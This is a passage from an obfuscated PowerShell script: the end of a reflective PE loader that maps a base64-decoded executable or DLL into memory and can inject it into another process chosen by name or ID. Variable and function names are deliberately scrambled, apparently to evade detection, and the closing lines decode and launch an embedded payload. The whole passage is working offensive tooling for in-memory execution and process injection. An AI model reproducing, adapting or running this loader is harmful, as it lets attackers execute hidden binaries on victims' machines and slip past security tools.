                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $XYhTkdpp99. Continuing anyways" -WarningAction Continue
                }

                $oTFkysOx99 = $EeGdRnzz99.FreeLibrary.Invoke($wAMROBuq99)
                if ($oTFkysOx99 -eq $false)
                {
                    Write-Warning "Unable to free library: $XYhTkdpp99. Continuing anyways." -WarningAction Continue
                }

                $CcGcZQFo99 = unkind ($CcGcZQFo99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $KYHuthfc99 = unkind ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $HxfEddrD99 = reallocated @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $IAQnWuHI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KYHuthfc99, $HxfEddrD99)

        $IAQnWuHI99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $oTFkysOx99 = $EeGdRnzz99.VirtualFree.Invoke($RIYjzmtQ99, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($oTFkysOx99 -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $EeGdRnzz99 = McDonald
        $rksQRGqN99 = elucidation
        $Win32Constants =  spooky

        $HrCwxdne99 = [IntPtr]::Zero

        if (($thdFCZIY99 -ne $null) -and ($thdFCZIY99 -ne 0) -and ($AnnKTTKI99 -ne $null) -and ($AnnKTTKI99 -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($AnnKTTKI99 -ne $null -and $AnnKTTKI99 -ne "")
        {
            $HIafljli99 = @(Get-Process -Name $AnnKTTKI99 -ErrorAction SilentlyContinue)
            if ($HIafljli99.Count -eq 0)
            {
                Throw "Can't find process $AnnKTTKI99"
            }
            elseif ($HIafljli99.Count -gt 1)
            {
                $YSiBmbqR99 = Get-Process | Where-Object { $_.Name -eq $AnnKTTKI99 } | Select-Object ProcessName, Id, SessionId
                Write-Output $YSiBmbqR99
                Throw "More than one instance of $AnnKTTKI99 found, please specify the process ID to inject in to."
            }
            else
            {
                $thdFCZIY99 = $HIafljli99[0].ID
            }
        }


        if (($thdFCZIY99 -ne $null) -and ($thdFCZIY99 -ne 0))
        {
            $HrCwxdne99 = $EeGdRnzz99.OpenProcess.Invoke(0x001F0FFF, $false, $thdFCZIY99)
            if ($HrCwxdne99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $thdFCZIY99"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        Write-Verbose "Calling elucidations"
        $RIYjzmtQ99 = [IntPtr]::Zero
        if ($HrCwxdne99 -eq [IntPtr]::Zero)
        {
            $ybpMlPNT99 = elucidations -cprRzWpK99 $cprRzWpK99 -eahMKUAG99 $eahMKUAG99 -ZUvfhSeS99 $ZUvfhSeS99
        }
        else
        {
            $ybpMlPNT99 = elucidations -cprRzWpK99 $cprRzWpK99 -eahMKUAG99 $eahMKUAG99 -HrCwxdne99 $HrCwxdne99 -ZUvfhSeS99 $ZUvfhSeS99
        }
        if ($ybpMlPNT99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $RIYjzmtQ99 = $ybpMlPNT99[0]
        $OthLibPw99 = $ybpMlPNT99[1] #only matters if you loaded in to a remote process


        $PEInfo = amassing -RIYjzmtQ99 $RIYjzmtQ99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($HrCwxdne99 -eq [IntPtr]::Zero))
        {
            switch ($puJTWmod99)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$mhRyhyyh99 = guerrilla -RIYjzmtQ99 $RIYjzmtQ99 -FunctionName "WStringFunc"
                    if ($mhRyhyyh99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $FwxUONQZ99 = reallocated @() ([IntPtr])
                    $AKVaAnmH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mhRyhyyh99, $FwxUONQZ99)
                    [IntPtr]$XIoKNxvg99 = $AKVaAnmH99.Invoke()
                    $VxKTKnBl99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($XIoKNxvg99)
                    Write-Output $VxKTKnBl99
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$iDklUqyZ99 = guerrilla -RIYjzmtQ99 $RIYjzmtQ99 -FunctionName "StringFunc"
                    if ($iDklUqyZ99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $yOFyQchn99 = reallocated @() ([IntPtr])
                    $BHReEjjx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iDklUqyZ99, $yOFyQchn99)
                    [IntPtr]$XIoKNxvg99 = $BHReEjjx99.Invoke()
                    $VxKTKnBl99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($XIoKNxvg99)
                    Write-Output $VxKTKnBl99
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$zkNDiRgK99 = guerrilla -RIYjzmtQ99 $RIYjzmtQ99 -FunctionName "VoidFunc"
                    if ($zkNDiRgK99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $xGHOeZBh99 = reallocated @() ([Void])
                    $FoZsuixu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zkNDiRgK99, $xGHOeZBh99)
                    $FoZsuixu99.Invoke() | Out-Null
                }
            }
        }
        elseif (($PEInfo.FileType -ieq "DLL") -and ($HrCwxdne99 -ne [IntPtr]::Zero))
        {
            $zkNDiRgK99 = guerrilla -RIYjzmtQ99 $RIYjzmtQ99 -FunctionName "VoidFunc"
            if (($zkNDiRgK99 -eq $null) -or ($zkNDiRgK99 -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $zkNDiRgK99 = remarkably $zkNDiRgK99 $RIYjzmtQ99
            $zkNDiRgK99 = unkind $zkNDiRgK99 $OthLibPw99

            $Null = muffling -zzlkUotp99 $HrCwxdne99 -StartAddress $zkNDiRgK99 -EeGdRnzz99 $EeGdRnzz99
        }

        if ($HrCwxdne99 -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            effect -RIYjzmtQ99 $RIYjzmtQ99
        }
        else
        {
            $oTFkysOx99 = $EeGdRnzz99.VirtualFree.Invoke($RIYjzmtQ99, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($oTFkysOx99 -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $WvcYtStV99  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    $GVEDIlcX99 = ($cprRzWpK99[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($GVEDIlcX99 -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $tikoqwtD99) {
        $cprRzWpK99[0] = 0
        $cprRzWpK99[1] = 0
    }

    if ($eahMKUAG99 -ne $null -and $eahMKUAG99 -ne '')
    {
        $eahMKUAG99 = "ReflectiveExe $eahMKUAG99"
    }
    else
    {
        $eahMKUAG99 = "ReflectiveExe"
    }

    if ($TGBzLQCs99 -eq $null -or $TGBzLQCs99 -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $mSsNHUVM99 -ArgumentList @($cprRzWpK99, $puJTWmod99, $thdFCZIY99, $AnnKTTKI99,$ZUvfhSeS99)
    }
    else
    {
        Invoke-Command -ScriptBlock $mSsNHUVM99 -ArgumentList @($cprRzWpK99, $puJTWmod99, $thdFCZIY99, $AnnKTTKI99,$ZUvfhSeS99) -TGBzLQCs99 $TGBzLQCs99
    }
}

Main
}

 
$cprRzWpK99 = [System.Convert]::FromBase64String($kCbRTprc99)
digressions -cprRzWpK99 $cprRzWpK99 -eahMKUAG99 $arguments
